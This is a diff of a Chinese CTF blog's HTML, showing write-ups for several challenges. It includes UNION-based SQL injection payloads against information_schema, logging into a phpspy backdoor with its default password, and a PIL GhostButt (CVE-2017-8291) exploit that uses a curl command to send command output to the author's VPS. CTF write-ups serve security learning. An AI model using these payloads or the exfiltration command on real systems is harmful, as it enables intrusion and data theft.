@@ -413,10 +413,10 @@ height:50vh;
 <h2 id="source-ip"><a href="#source-ip" class="headerlink" title="source ip"></a>source ip</h2><p>题目:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">找到目标网站www.mooctest.net的源ip</span><br></pre></td></tr></table></figure></p>
 <p>网站用了cdn<br>科普cdn：<br>CDN的基本原理是广泛采用各种缓存服务器，将这些缓存服务器分布到用户访问相对集中的地区或网络中，在用户访问网站时，利用全局负载技术将用户的访问指向距离最近的工作正常的缓存服务器上，由缓存服务器直接响应用户请求。<br>所以直接去获取Ip就很难<br>但是网站提供了邮件找回密码的功能，于是乎让他给我发邮件……<br>然后按照<code>https://jingyan.baidu.com/article/17bd8e522abb8085ab2bb8b2.html</code>的教程，即可得到他的ip<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Received: from iZ2321y531vZ (unknown [114.55.91.83])</span><br><span class="line">	by trigger.edmcn.cn (Postfix) with ESMTPA id 96C3EE109D</span><br></pre></td></tr></table></figure></p>
 <h2 id="hackedsite"><a href="#hackedsite" class="headerlink" title="hackedsite"></a>hackedsite</h2><p>一道有毒的题，拼的就是字典<br>疯狂拿字典扫:<br>得到upload目录，再疯狂拿字典扫：<br>得到phpspy.php<br>然后去百度搜索phpspy.php这个文件<br>发现是个专门写的后门，默认密码是angel<br>随手尝试了一下，还真的是。。。。。<br>然后登进去看到flag.php，于是乎读到flag：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = <span class="string">"flag&#123;6bde96163d1f8fa1bfa7947dc5822558&#125;"</span>;</span><br></pre></td></tr></table></figure></p>
-<h2 id="babysql3"><a href="#babysql3" class="headerlink" title="babysql3"></a>babysql3</h2><p>题目链接:<code>http://114.55.91.27:46018/</code><br>拿到后分析题目：<br><code>keyname=1&amp;name=id</code><br>前面一个参数是关键词，后面一个是字段名<br><code>select * from table where $name = $keyname;</code><br>所以我打算直接在<code>$name</code>这里注入了，试了一会儿全都gg了<br>然后想既然又是babysql，会不会又有tickback(md的tickback反引号不能写……一写就gg，我就直接写tickback了)<br>(可能我比较菜，转义失败了，于是就模仿雨牛了……直接用tickback写了)<br>故猜测源码应该这么写：<br>select * from table where (tickback)$name(tickback) = $keyname;<br>然后再尝试注入:<br>keyname=1&amp;name=id(tickback)=0 union select 1,2,3–<br>即可得到回显:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;i&gt;&lt;/i&gt; 1      &lt;/td&gt;</span><br><span class="line">     &lt;td&gt;2&lt;/td&gt;</span><br><span class="line">     &lt;td&gt;3&lt;/td&gt;</span><br></pre></td></tr></table></figure></p>
-<p>再尝试表<br>keyname=1&amp;name=id(tickback)=0 union select 1,(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 0,1),3–<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;i&gt;&lt;/i&gt; 1      &lt;/td&gt;</span><br><span class="line">     &lt;td&gt;flag&lt;/td&gt;</span><br><span class="line">     &lt;td&gt;3&lt;/td&gt;</span><br></pre></td></tr></table></figure></p>
-<p>再尝试爆字段<br>keyname=1&amp;name=id(tickback)=0 union select 1,(select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=’flag’ limit 0,1),3–<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;i&gt;&lt;/i&gt; 1      &lt;/td&gt;</span><br><span class="line">     &lt;td&gt;flag&lt;/td&gt;</span><br><span class="line">     &lt;td&gt;3&lt;/td&gt;</span><br></pre></td></tr></table></figure></p>
-<p>然后直接读数据<br>keyname=1&amp;name=id(tickback)=0 union select 1,(select flag from flag),3–<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;i&gt;&lt;/i&gt; 1      &lt;/td&gt;</span><br><span class="line">      &lt;td&gt;flag&#123;b3a46a02139c062f50f0a5c284edc4da&#125;&lt;/td&gt;</span><br><span class="line">      &lt;td&gt;3&lt;/td&gt;</span><br></pre></td></tr></table></figure></p>
+<h2 id="babysql3"><a href="#babysql3" class="headerlink" title="babysql3"></a>babysql3</h2><p>题目链接:<code>http://114.55.91.27:46018/</code><br>拿到后分析题目：<br><code>keyname=1&amp;name=id</code><br>前面一个参数是关键词，后面一个是字段名<br><code>select * from table where $name = $keyname;</code><br>所以我打算直接在<code>$name</code>这里注入了，试了一会儿全都gg了<br>然后想既然又是babysql，会不会又有tickback(md的tickback反引号不能写……一写就gg，我就直接写tickback了)<br>(可能我比较菜，转义失败了，于是就模仿雨牛了……直接用tickback写了)<br>故猜测源码应该这么写：<br>select * from table where (tickback)$name(tickback) = $keyname;<br>然后再尝试注入:<br>keyname=1&amp;name=id(tickback)=0 union select 1,2,3—<br>即可得到回显:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;i&gt;&lt;/i&gt; 1      &lt;/td&gt;</span><br><span class="line">     &lt;td&gt;2&lt;/td&gt;</span><br><span class="line">     &lt;td&gt;3&lt;/td&gt;</span><br></pre></td></tr></table></figure></p>
+<p>再尝试表<br>keyname=1&amp;name=id(tickback)=0 union select 1,(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 0,1),3—<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;i&gt;&lt;/i&gt; 1      &lt;/td&gt;</span><br><span class="line">     &lt;td&gt;flag&lt;/td&gt;</span><br><span class="line">     &lt;td&gt;3&lt;/td&gt;</span><br></pre></td></tr></table></figure></p>
+<p>再尝试爆字段<br>keyname=1&amp;name=id(tickback)=0 union select 1,(select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=’flag’ limit 0,1),3—<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;i&gt;&lt;/i&gt; 1      &lt;/td&gt;</span><br><span class="line">     &lt;td&gt;flag&lt;/td&gt;</span><br><span class="line">     &lt;td&gt;3&lt;/td&gt;</span><br></pre></td></tr></table></figure></p>
+<p>然后直接读数据<br>keyname=1&amp;name=id(tickback)=0 union select 1,(select flag from flag),3—<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;i&gt;&lt;/i&gt; 1      &lt;/td&gt;</span><br><span class="line">      &lt;td&gt;flag&#123;b3a46a02139c062f50f0a5c284edc4da&#125;&lt;/td&gt;</span><br><span class="line">      &lt;td&gt;3&lt;/td&gt;</span><br></pre></td></tr></table></figure></p>
 <p>即可拿到flag</p>
 <h2 id="python-PIL-RCE"><a href="#python-PIL-RCE" class="headerlink" title="python PIL RCE"></a>python PIL RCE</h2><p>谷歌一波，搜到了CVE:<br><code>GhostButt CVE-2017-8291</code><br>然后使用了P牛的POC：<br><code>https://github.com/vulhub/vulhub/blob/master/python/PIL-CVE-2017-8291/poc.png</code><br>阅读readme：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">比如poc.png，我们上传之，即可执行touch /tmp/aaaaa。将POC中的命令改为反弹命令，即可获得shell：</span><br></pre></td></tr></table></figure></p>
 <p>所以将其中的指令改为反弹shell，但是很遗憾，反弹失败。<br>然后执念于心大佬给了我一个payload：<br><code>curl 你的vps/你的接受文件?a=(tickback)ls(tickback)</code><br>然后可以把对方服务器上ls执行的结果返回回来<br>于是乎:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /var/www&amp;&amp;ls</span><br><span class="line">回显Flask，于是找到了flag的位置</span><br><span class="line">cat /var/www/Flask/flag |base64</span><br></pre></td></tr></table></figure></p>
@@ -2925,9 +2925,23 @@ top:50vh;
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 135
+        Total : 137
         </div>
         <!-- search  -->
         
@@ -2940,6 +2954,16 @@ top:50vh;
     
     <div class="archive-year"> 2018 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/24</span><a class="archive-post-title" href= "/2018/08/24/Crypto之击破多层加密/" >Crypto之击破多层加密</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/24</span><a class="archive-post-title" href= "/2018/08/24/RSA之拒绝套路(1)/" >RSA之拒绝套路(1)</a>
+        </li>
     
     
         <li class="archive-post-item">
